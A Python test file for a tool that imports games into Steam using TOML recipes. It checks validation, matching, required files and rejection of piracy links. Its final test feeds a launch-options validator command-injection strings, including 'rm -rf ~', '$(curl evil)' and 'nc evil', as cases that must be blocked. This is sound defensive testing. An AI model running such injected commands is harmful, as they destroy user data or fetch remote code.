"""Tests for recipe load/validate/match and the importer applying recipes."""

import pytest

from deckport import recipe as rcp
from deckport import vdf
from deckport.importer import import_games

pytestmark = pytest.mark.skipif(not rcp.TOML_AVAILABLE, reason="needs tomllib (3.11+) / tomli")

ELF = b"\x7fELF" + b"\x00" * 8192

NATIVE_TOML = """\
[game]
title = "Cool Game"
slug = "cool-game"
aliases = ["coolgame", "CoolGame.x86_64"]
type = "native"
engine = "godot"

[launch]
binary = "CoolGame.x86_64"
launch_options = "--fullscreen %command%"
requires_files = ["data.pck"]

[meta]
status = "needs-test"
"""


def _write(path, text):
    with open(path, "w", encoding="utf-8") as f:
        f.write(text)


def test_load_fields(tmp_path):
    p = tmp_path / "cool-game.toml"
    _write(p, NATIVE_TOML)
    r = rcp.load(str(p))
    assert r.slug == "cool-game" and r.title == "Cool Game"
    assert r.binary == "CoolGame.x86_64"
    assert r.launch_options == "--fullscreen %command%"
    assert r.requires_files == ["data.pck"]
    assert r.engine == "godot" and r.type == "native"
    assert r.source == "cool-game.toml"


def test_validate_good_and_bad(tmp_path):
    p = tmp_path / "cool-game.toml"
    _write(p, NATIVE_TOML)
    assert rcp.validate(rcp.load(str(p))) == []

    bad = rcp.Recipe(slug="x", title="X", type="weird", engine="nope", status="working", binary="")
    errs = " ".join(rcp.validate(bad))
    assert "type" in errs and "engine" in errs and "binary" in errs
    assert "verified_on" in errs  # working without verified_on is rejected


def test_forbidden_content_rejected(tmp_path):
    # A recipe linking a ROM/abandonware source must fail the content line.
    toml = NATIVE_TOML + """
[links]
[[links.guides]]
title = "download here"
url = "https://www.myabandonware.com/game/whatever"
"""
    p = tmp_path / "cool-game.toml"
    _write(p, toml)
    errs = " ".join(rcp.validate(rcp.load(str(p))))
    assert "content-line" in errs and "myabandonware" in errs


def test_magnet_link_rejected(tmp_path):
    toml = NATIVE_TOML.replace('status = "needs-test"',
                               'status = "needs-test"\ncaveats = "get it magnet:?xt=urn:btih:abc"')
    p = tmp_path / "cool-game.toml"
    _write(p, toml)
    assert any("content-line" in e for e in rcp.validate(rcp.load(str(p))))


def test_proton_requires_version(tmp_path):
    toml = """\
[game]
title = "Win Game"
slug = "win-game"
type = "proton"
engine = "other"

[launch]
binary = "Game.exe"

[proton]
version = ""

[meta]
status = "unverified"
"""
    p = tmp_path / "win-game.toml"
    _write(p, toml)
    assert any("proton.version" in e for e in rcp.validate(rcp.load(str(p))))


def test_borked_requires_caveats(tmp_path):
    toml = NATIVE_TOML.replace('status = "needs-test"', 'status = "borked"')
    p = tmp_path / "cool-game.toml"
    _write(p, toml)
    assert any("borked" in e and "caveats" in e for e in rcp.validate(rcp.load(str(p))))


def test_match_folder(tmp_path):
    p = tmp_path / "cool-game.toml"
    _write(p, NATIVE_TOML)
    recipes = [rcp.load(str(p))]
    assert rcp.match_folder(recipes, "Cool Game (Linux)", set()).slug == "cool-game"  # cleaned name
    assert rcp.match_folder(recipes, "coolgame", set()).slug == "cool-game"  # alias
    assert rcp.match_folder(recipes, "whatever", {"CoolGame.x86_64"}).slug == "cool-game"  # binary
    assert rcp.match_folder(recipes, "Totally Other", {"other"}) is None


def test_missing_requires(tmp_path):
    p = tmp_path / "cool-game.toml"
    _write(p, NATIVE_TOML)
    r = rcp.load(str(p))
    folder = tmp_path / "game"
    folder.mkdir()
    assert rcp.missing_requires(r, str(folder)) == ["data.pck"]
    (folder / "data.pck").write_bytes(b"x")
    assert rcp.missing_requires(r, str(folder)) == []


def test_load_dir_skips_template_and_bad(tmp_path):
    _write(tmp_path / "cool-game.toml", NATIVE_TOML)
    _write(tmp_path / "_template.toml", NATIVE_TOML)  # underscore -> skipped
    _write(tmp_path / "broken.toml", "this is = = not toml [[[")
    loaded = rcp.load_dir(str(tmp_path))
    assert [r.slug for r in loaded] == ["cool-game"]  # template + broken skipped


# -- importer applies the recipe --------------------------------------------

def test_importer_uses_recipe_binary_and_launch_options(tmp_path):
    games = tmp_path / "Games"
    game = games / "Cool Game (1.0)"
    game.mkdir(parents=True)
    # Two ELF candidates: a big 'launcher' auto-detect might prefer, and the real one.
    (game / "launcher.x86_64").write_bytes(ELF + b"\x00" * 50_000_000 if False else ELF)
    (game / "CoolGame.x86_64").write_bytes(ELF)
    (game / "data.pck").write_bytes(b"data")  # required file present
    recipes = [_loaded(tmp_path)]
    shortcuts = tmp_path / "userdata" / "1" / "config" / "shortcuts.vdf"
    shortcuts.parent.mkdir(parents=True)

    res = import_games(str(games), str(shortcuts), recipes=recipes, set_exec_bit=False)
    assert len(res.added) == 1
    g = res.added[0]
    assert g.name == "Cool Game"  # recipe title
    assert g.binary.endswith("CoolGame.x86_64")  # recipe-pinned binary, not auto-detect
    assert g.recipe == "cool-game.toml"
    sc = vdf.load_shortcuts(str(shortcuts))["0"]
    assert sc["LaunchOptions"] == "--fullscreen %command%"


def test_importer_skips_when_required_file_missing(tmp_path):
    games = tmp_path / "Games"
    game = games / "Cool Game"
    game.mkdir(parents=True)
    (game / "CoolGame.x86_64").write_bytes(ELF)
    # data.pck deliberately absent
    recipes = [_loaded(tmp_path)]
    shortcuts = tmp_path / "sc.vdf"
    res = import_games(str(games), str(shortcuts), recipes=recipes, set_exec_bit=False)
    assert res.added == []
    assert any("missing required file" in why for _, why in res.skipped)


def _loaded(tmp_path):
    p = tmp_path / "cool-game.toml"
    _write(p, NATIVE_TOML)
    return rcp.load(str(p))


def test_unsafe_launch_options_blocks_shell_metachars():
    from deckport.recipe import unsafe_launch_options as u
    # legit Steam launch options pass clean
    for ok in [
        "", "%command%", "PROTON_NO_D3D11=1 %command%",
        'WINEDLLOVERRIDES="d3d8,ddraw=n,b" %command%',
        "run org.zdoom.GZDoom -iwad doom2.wad", "java -jar Mindustry.jar",
    ]:
        assert u(ok) == [], ok
    # command chaining / substitution is rejected
    for bad in [
        "evil; rm -rf ~ %command%", "$(curl evil) %command%",
        "%command% && wget x", "a`id`b", "x | nc evil 1", "a & b",
    ]:
        assert u(bad) != [], bad
